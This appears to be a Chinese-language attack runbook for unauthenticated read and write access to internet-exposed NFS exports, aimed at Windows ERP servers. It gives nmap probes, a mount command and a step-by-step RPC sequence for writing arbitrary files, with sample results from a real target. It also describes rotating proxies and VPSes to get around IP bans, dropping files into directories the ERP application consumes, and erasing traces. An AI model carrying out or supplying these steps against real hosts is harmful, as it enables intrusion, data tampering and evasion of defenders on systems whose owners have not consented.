# NFS 导出无认证读写（AUTH_UNIX uid=0 → nobody）

## 适用面
rpcbind(111)/NFS(2049) 对公网暴露、导出未做源 IP/认证限制、auth_flavors 仅 [1]（AUTH_UNIX）的主机。常见形态：Windows + Exchequer/NAV 类 ERP 一体机，导出 /ENTERPRISE（即 X:\Ent\，应用+数据盘）。

## 前置条件
- 可达 2049/tcp（或 2049/udp）与 111/tcp·udp。
- 无需任何账号：AUTH_UNIX uid=0/gid=0 会被服务端映射为 nobody（uid/gid=4294967294）。别期待以 root 身份落文件。
- 出口若被目标做过 IP 级封禁，需要可切换出口（公共 HTTP CONNECT 代理 / 多 VPS）。注意 HTTP CONNECT 只能承载 TCP，UDP 需 socks5 或直连。
- 客户端：有 mount 权限最简；容器内无 CAP_SYS_ADMIN / 无 nfs-common 时，用自写 RPC 客户端（Python xdrlib 手搓或 go-nfs）。

## 探测
```
nmap -Pn -sU -p 111 --script rpcinfo <ip>
nmap -Pn -sU -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <ip>
```
判据：rpcinfo 列出 100003(nfs) 与 100005(mountd)；showmount 能列出导出；nfs-ls 的 access 含 Read/Modify/Extend/Delete。

## 挂载（有权限时）
```
mount -t nfs -o vers=3,nolock,proto=tcp <ip>:/ENTERPRISE /mnt
```
nolock 必须加，否则 statd 不通会卡住；proto=tcp 用于 2049/tcp 可达而 UDP 被过滤的环境。

## 协议级复现（无 mount 权限时，逐步照抄）
程序号/版本/proc：
- MOUNT：100005 / 3 / 1(MNT)
- NFSv3：100003 / 3 / 1(GETATTR)、4(ACCESS)、8(CREATE)、9(MKDIR)、7(WRITE)、6(READ)、17(READDIRPLUS)、12(REMOVE)、13(RMDIR)
- NFSv2：100003 / 2 / 10(REMOVE)、15(RMDIR) —— 清理兜底

凭据：AUTH_UNIX flavor=1, stamp, machine, uid=0, gid=0, gids=[]。

1) MOUNT v3：dirpath="/ENTERPRISE"
   成功 status=0，返回 32 字节 NFSv3 filehandle。**fh 是逐主机/逐导出生成的，必须现场取，不要复用别处的值。**
   失败 status=13 = MNT3ERR_ACCES（导出 allow list 不含本机）；status=2 = NOENT（导出名不对，先 showmount -e）。
2) GETATTR(fh)：期望 type=2(DIR)。mode=0777 + uid/gid=4294967294 说明 world 可写且身份被映射为 nobody。
3) ACCESS(fh, mask=0x3f)：位定义 READ 0x01 / LOOKUP 0x02 / MODIFY 0x04 / EXTEND 0x08 / DELETE 0x10 / EXECUTE 0x20。
   result 含 0x04|0x08|0x10 即服务端自证可写（实测 0x1f）。
4) MKDIR(proc9)：diropargs{dir=fh, name="W-<rand>"} + sattr{mode=0777} → status=0
5) CREATE(proc8)：diropargs{dir=新目录 fh, name="w-<ts>.txt"} + how=UNCHECKED(0) + sattr{mode=0666, size=-1, uid=-1, gid=-1} → status=0
6) WRITE(proc7)：fh, offset=0, count=N, stable=FILE_SYNC(2), data → status=0 且 committed=1（FILE_SYNC 才算真正落盘；UNSTABLE 需补 COMMIT proc21）
7) READ(proc6) 回读：len=N、eof=1、逐字节 bytes_equal=True，再 GETATTR 看 size=N → 任意文件写入坐实
8) 清理：v3 REMOVE/RMDIR 在部分 Windows NFS 实现上会返 5(EIO)/66(NOTEMPTY)/SETATTR 13/RENAME 10007；改走 NFSv2 REMOVE(proc10)/RMDIR(proc15) 通常 status=0。最后 READDIRPLUS(proc17) 确认无残留。

### 实测证据样例（/ENTERPRISE）
```
MOUNT   status=0  fh=0500...528c
GETATTR type=2(DIR) mode=0777 uid/gid=4294967294 size=24576
ACCESS  mask=0x3f status=0 result=0x1f
MKDIR   status=0
CREATE  status=0
WRITE   status=0 count=189 committed=1
READ    status=0 len=189 eof=1 bytes_equal=True; GETATTR size=189
CLEANUP v3 REMOVE=5 / RMDIR=66 → v2 REMOVE/RMDIR=0; READDIRPLUS "remaining: []"
```

## 判据小结
- 可读：READ 内容与预期一致。
- 可写：MKDIR+CREATE+WRITE(committed=1)+READ 全链路 status=0 且字节一致。**只有 ACCESS 报可写不算已利用，必须实际写入并回读。**

## 常见失败与处置
- 2049/111 全部超时、ICMP 也丢：先判断是不是本出口 IP 被封——同一出口打一台已知可达主机做对照。大量 READ 后触发 IP 级封禁很常见，读写验证要放在同一时间窗，并预置可切换出口。
- mount 报 "access denied by server"：导出的客户端白名单不含本机，协议层同样会在 MOUNT 返回 13。
- CREATE status=17：同名已存在，换随机名。
- WRITE status=13/30：服务端只读或权限位不含 MODIFY，写路径不通。
- WRITE 成功但 READ 空/短：用了 UNSTABLE 且未 COMMIT；改 FILE_SYNC 或补 COMMIT。
- mount 挂死：加 nolock,proto=tcp,vers=3；或直接走协议层。

## 升级面（均为待验证假设，勿当作已成立）
- 导出盘同时是 ERP 程序/数据盘时，可投递到 move_file 宏工作簿、EWS Conduit / DSN 同步目录等被应用周期性消费的位置；是否被执行取决于 ERP 调度与文件类型策略，需单独验证。
- 不要假定"写文件=webshell"：实测同机 8080 IIS 对盘内路径返回 404，HTTP 根不在该导出内；根下 Inetpub/wwwroot/Program Files/NAV/web.config 等 LOOKUP 均为 NOENT(2)。

## 痕迹
测试目录/文件用唯一前缀（含时间戳），完成后全量删除并 READDIRPLUS 复查，保留 fh 与各步 status 作为证据。